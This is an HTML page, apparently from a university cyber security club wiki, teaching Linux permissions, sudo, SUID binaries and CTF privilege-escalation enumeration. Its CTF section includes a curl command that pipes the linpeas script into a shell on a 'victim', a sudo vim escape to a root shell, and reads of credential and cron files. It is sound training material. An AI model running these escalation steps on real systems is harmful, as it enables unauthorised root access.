@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.160.1">
+    <meta name="generator" content="Relearn 9.0.3+dd4f8457f5143e91eae3954813494d2b0cc6741c">
+    <meta name="description" content="Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.
+The Permission Model Every file has three permission sets: owner, group, others.
+-rwxr-xr-- 1 alice staff 4096 may 29 file.sh ^^^ owner group ^^^ group permissions ^^^ everyone else Each set has three bits: r (read), w (write), x (execute).">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Permissions &amp; Users :: FAU Cyber Security Club">
+    <meta name="twitter:description" content="Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.
+The Permission Model Every file has three permission sets: owner, group, others.
+-rwxr-xr-- 1 alice staff 4096 may 29 file.sh ^^^ owner group ^^^ group permissions ^^^ everyone else Each set has three bits: r (read), w (write), x (execute).">
+    <meta property="og:url" content="https://example.org/linux/permissions/index.html">
+    <meta property="og:site_name" content="FAU Cyber Security Club">
+    <meta property="og:title" content="Permissions &amp; Users :: FAU Cyber Security Club">
+    <meta property="og:description" content="Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.
+The Permission Model Every file has three permission sets: owner, group, others.
+-rwxr-xr-- 1 alice staff 4096 may 29 file.sh ^^^ owner group ^^^ group permissions ^^^ everyone else Each set has three bits: r (read), w (write), x (execute).">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Linux">
+    <meta itemprop="name" content="Permissions &amp; Users :: FAU Cyber Security Club">
+    <meta itemprop="description" content="Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.
+The Permission Model Every file has three permission sets: owner, group, others.
+-rwxr-xr-- 1 alice staff 4096 may 29 file.sh ^^^ owner group ^^^ group permissions ^^^ everyone else Each set has three bits: r (read), w (write), x (execute).">
+    <meta itemprop="wordCount" content="670">
+    <title>Permissions &amp; Users :: FAU Cyber Security Club</title>
+    <link href="/css/auto-complete/auto-complete.min.css?1780078471" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1780078471" defer></script>
+    <script src="/js/search-lunr.min.js?1780078471" defer></script>
+    <script src="/js/search.min.js?1780078471" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1780078471";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1780078471" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1780078471" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1780078471" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1780078471" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1780078471" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1780078471" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1780078471" rel="stylesheet">
+    <link href="/css/theme.min.css?1780078471" rel="stylesheet">
+    <link href="/css/format-html.min.css?1780078471" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = `.min`;
+      window.relearn.path='\/linux\/permissions\/index.html';
+      window.relearn.relBasePath='..\/..';
+      window.relearn.relBaseUri='..\/..';
+      window.relearn.absBaseUri='https:\/\/example.org';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'hacker' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/linux/permissions/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#the-permission-model">The Permission Model</a></li>
+    <li><a href="#changing-permissions">Changing Permissions</a></li>
+    <li><a href="#ownership">Ownership</a></li>
+    <li><a href="#sudo-and-root">sudo and Root</a></li>
+    <li><a href="#special-permissions-suidsgid">Special Permissions: SUID/SGID</a></li>
+    <li><a href="#users-and-groups">Users and Groups</a></li>
+    <li><a href="#in-ctf-environments">In CTF Environments</a></li>
+    <li><a href="#using-ai">Using AI</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">FAU Cyber Security Club</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/linux/index.html"><span itemprop="name">Linux</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Permissions &amp; Users</span><meta itemprop="position" content="3"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/linux/filesystem/index.html" title="The Filesystem (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/linux/processes/index.html" title="Processes & Services (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable linux" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+  </header>
+
+<h1 id="permissions--users">Permissions &amp; Users</h1>
+
+<p>Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.</p>
+<hr>
+<h2 id="the-permission-model">The Permission Model<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Every file has three permission sets: <strong>owner</strong>, <strong>group</strong>, <strong>others</strong>.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>-rwxr-xr--  1  alice  staff  4096  may 29  file.sh
+ ^^^         owner    group
+    ^^^      group permissions
+       ^^^   everyone else</code></pre></div>
+<p>Each set has three bits: <strong>r</strong> (read), <strong>w</strong> (write), <strong>x</strong> (execute).</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la          <span style="color:#75715e"># see permissions on all files</span>
+</span></span><span style="display:flex;"><span>stat file.txt   <span style="color:#75715e"># detailed file metadata</span></span></span></code></pre></div>
+<hr>
+<h2 id="changing-permissions">Changing Permissions<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">755</span> script.sh     <span style="color:#75715e"># rwxr-xr-x — owner can do everything, others can read/execute</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">644</span> config.txt    <span style="color:#75715e"># rw-r--r-- — owner read/write, others read only</span>
+</span></span><span style="display:flex;"><span>chmod +x script.sh      <span style="color:#75715e"># add execute for everyone</span>
+</span></span><span style="display:flex;"><span>chmod -r file.txt       <span style="color:#75715e"># remove read for everyone</span></span></span></code></pre></div>
+<p>Learn both octal (<code>755</code>) and symbolic (<code>+x</code>) notation. You will see both in the wild.</p>
+<hr>
+<h2 id="ownership">Ownership<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chown alice file.txt          <span style="color:#75715e"># change owner</span>
+</span></span><span style="display:flex;"><span>chown alice:staff file.txt    <span style="color:#75715e"># change owner and group</span>
+</span></span><span style="display:flex;"><span>chgrp staff file.txt          <span style="color:#75715e"># change group only</span></span></span></code></pre></div>
+<hr>
+<h2 id="sudo-and-root">sudo and Root<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><code>sudo</code> runs a command as root. Root has no permission restrictions.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo command            <span style="color:#75715e"># run as root</span>
+</span></span><span style="display:flex;"><span>sudo -l                 <span style="color:#75715e"># list what you can sudo as current user</span>
+</span></span><span style="display:flex;"><span>sudo -u otheruser cmd   <span style="color:#75715e"># run as a different user</span>
+</span></span><span style="display:flex;"><span>su - username           <span style="color:#75715e"># switch to another user (needs their password)</span></span></span></code></pre></div>
+
+<details open class="box cstyle notices warning">
+  <summary class="box-label" tabindex="-1">
+    <i class="fa-fw fas fa-exclamation-triangle"></i> 
+    sudo -l is a Privilege Escalation Step
+  </summary>
+  <div class="box-content">
+<p>On a compromised system, <code>sudo -l</code> is one of the first things you run. It shows what commands you can execute as root without a password. Misconfigured sudo entries are a common path to root.</p>
+  </div>
+</details>
+<hr>
+<h2 id="special-permissions-suidsgid">Special Permissions: SUID/SGID<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>When SUID is set on a binary, it runs as the file&rsquo;s owner, not the caller.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null    <span style="color:#75715e"># find SUID binaries</span>
+</span></span><span style="display:flex;"><span>find / -perm -2000 2&gt;/dev/null    <span style="color:#75715e"># find SGID binaries</span></span></span></code></pre></div>
+<p>A SUID binary owned by root that can be manipulated by a low-privilege user is a classic privilege escalation vector. <a href="https://gtfobins.github.io/" rel="external">GTFOBins</a> catalogs these.</p>
+<hr>
+<h2 id="users-and-groups">Users and Groups<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami                    <span style="color:#75715e"># current user</span>
+</span></span><span style="display:flex;"><span>id                        <span style="color:#75715e"># uid, gid, and group memberships</span>
+</span></span><span style="display:flex;"><span>cat /etc/passwd           <span style="color:#75715e"># all user accounts</span>
+</span></span><span style="display:flex;"><span>cat /etc/group            <span style="color:#75715e"># all groups</span>
+</span></span><span style="display:flex;"><span>getent passwd username    <span style="color:#75715e"># info on a specific user</span></span></span></code></pre></div>
+<p><code>/etc/shadow</code> stores hashed passwords. Only readable by root.</p>
+<hr>
+<h2 id="in-ctf-environments">In CTF Environments<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Privilege escalation (privesc) is one of the most common CTF phases on Linux boxes. You land as a low-privilege user and need to get to root.</p>
+<p><strong>Standard privesc enumeration:</strong></p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># What can you sudo?</span>
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SUID binaries — check each against GTFOBins</span>
+</span></span><span style="display:flex;"><span>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Writable files owned by root (scripts called by cron, etc.)</span>
+</span></span><span style="display:flex;"><span>find / -writable -user root -type f 2&gt;/dev/null | grep -v proc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cron jobs running as root</span>
+</span></span><span style="display:flex;"><span>cat /etc/crontab
+</span></span><span style="display:flex;"><span>ls -la /etc/cron*
+</span></span><span style="display:flex;"><span>cat /var/spool/cron/crontabs/root 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Interesting capabilities</span>
+</span></span><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null</span></span></code></pre></div>
+<p><strong>Exploiting a misconfigured sudo entry:</strong></p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If sudo -l shows: (root) NOPASSWD: /usr/bin/vim</span>
+</span></span><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:!/bin/bash&#39;</span>   <span style="color:#75715e"># drop into a root shell from within vim</span></span></span></code></pre></div>
+<p><strong>GTFOBins workflow:</strong> find a SUID binary or sudo-allowed binary → go to <a href="https://gtfobins.github.io/" rel="external">gtfobins.github.io</a> → look up the binary → run the listed exploit.</p>
+<p><strong>Automated enumeration scripts</strong> (use after manual checks):</p>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng" rel="external">linpeas.sh</a> — comprehensive Linux privesc enumeration</li>
+<li><a href="https://github.com/rebootuser/LinEnum" rel="external">linenum.sh</a> — older but still useful</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Download and run linpeas on a target (requires internet from victim or file transfer)</span>
+</span></span><span style="display:flex;"><span>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</span></span></code></pre></div>
+<hr>
+<h2 id="using-ai">Using AI<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><strong>Where it helps on permissions:</strong></p>
+<ul>
+<li><strong>Interpreting <code>sudo -l</code> output:</strong> Paste the output. Ask &ldquo;which of these entries can be exploited for privilege escalation?&rdquo; AI knows GTFOBins and common sudo misconfigurations.</li>
+<li><strong>Explaining SUID findings:</strong> Paste the list of SUID binaries. Ask which ones are interesting and what attacks apply.</li>
+<li><strong>chmod math:</strong> &ldquo;What does chmod 4755 mean?&rdquo; Faster than calculating mentally.</li>
+<li><strong>Writing privesc scripts:</strong> &ldquo;Write a bash script that checks for world-writable cron scripts and SUID binaries and prints a summary.&rdquo; Good starting point.</li>
+<li><strong>Reading linpeas output:</strong> The output is long and color-coded. Paste sections and ask what to prioritize.</li>
+</ul>
+<hr>
+
+<details open class="box cstyle notices info">
+  <summary class="box-label" tabindex="-1">
+    <i class="fa-fw fas fa-info-circle"></i> 
+    How the Club Uses This
+  </summary>
+  <div class="box-content">
+<p>TODO: Add privilege escalation scenarios or CTF challenges the club has worked through.</p>
+  </div>
+</details>
+<hr>
+<p><strong>References</strong></p>
+<ul>
+<li><a href="https://gtfobins.github.io/" rel="external">GTFOBins</a> — SUID/sudo privilege escalation reference</li>
+<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" rel="external">Linux Privilege Escalation checklist</a></li>
+<li><a href="https://chmod-calculator.com/" rel="external">chmod calculator</a></li>
+</ul>
+
+  <footer class="footline">
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">FAU Cyber Security Club</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation homelinks">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-home default-animation">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="" data-nav-id="/introduction/index.html"><a class="padding default-animation" href="/introduction/index.html">Introduction</a><ul id="R-subsections-e1ed3a04f1f57a27be4a8d0eb274be18" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/virtual-machines/index.html"><a class="padding default-animation" href="/virtual-machines/index.html">Virtual Machines</a><ul id="R-subsections-874cad8e32e27d3815c2fbe38c2c4129" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/linux/index.html"><a class="padding default-animation" href="/linux/index.html">Linux</a><ul id="R-subsections-e2509333b88222aa06f1b5fc60b020b2" class="collapsible-menu">
+            <li class="" data-nav-id="/linux/filesystem/index.html"><a class="padding" href="/linux/filesystem/index.html">The Filesystem</a></li>
+            <li class="active " data-nav-id="/linux/permissions/index.html"><a class="padding" href="/linux/permissions/index.html">Permissions &amp; Users</a></li>
+            <li class="" data-nav-id="/linux/processes/index.html"><a class="padding" href="/linux/processes/index.html">Processes &amp; Services</a></li></ul></li>
+            <li class="" data-nav-id="/networking/index.html"><a class="padding default-animation" href="/networking/index.html">Networking</a><ul id="R-subsections-d7c3359b808d40df139a3bb9f9073483" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/cli-scripting/index.html"><a class="padding default-animation" href="/cli-scripting/index.html">CLI &amp; Scripting</a><ul id="R-subsections-c73e482835d9355e5f1e382f2ae56552" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/web-fundamentals/index.html"><a class="padding default-animation" href="/web-fundamentals/index.html">Web &amp; System Fundamentals</a><ul id="R-subsections-a148b684aeed8492b8c3e70b6f24edc4" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/ctf/index.html"><a class="padding default-animation" href="/ctf/index.html">CTF</a><ul id="R-subsections-b7de208e1dbb9555f350027fc09192d1" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/specializations/index.html"><a class="padding default-animation" href="/specializations/index.html">Specializations</a><ul id="R-subsections-df6b5100c51808a0b68da3e53f945bbc" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/ai-security/index.html"><a class="padding default-animation" href="/ai-security/index.html">AI &amp; Agents for Security</a><ul id="R-subsections-76c8f223c8f20ea8d87d51384f1f5997" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/contributing/index.html"><a class="padding default-animation" href="/contributing/index.html">Contributing to the Club</a><ul id="R-subsections-0d02badb7422c7536b9ac4528048a4b1" class="collapsible-menu"></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">Quick Links</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://discord.gg/kHvmg3AFhN"><a class="padding" href="https://discord.gg/kHvmg3AFhN" rel="external"><i class='fab fa-fw fa-discord'></i> Discord</a></li>
+            <li class="" data-nav-id="https://github.com/dxcently/fau-cyber-security-club-wiki"><a class="padding" href="https://github.com/dxcently/fau-cyber-security-club-wiki" rel="external"><i class='fab fa-fw fa-github'></i> GitHub</a></li>
+            <li class="" data-nav-id="https://github.com/dxcently/fau-cyber-security-club-wiki"><a class="padding" href="https://github.com/dxcently/fau-cyber-security-club-wiki" rel="external"><i class='fa-solid fa-school-flag'></i> Owl Central</a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1780078471" defer></script>
+    <script src="/js/theme.min.js?1780078471" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
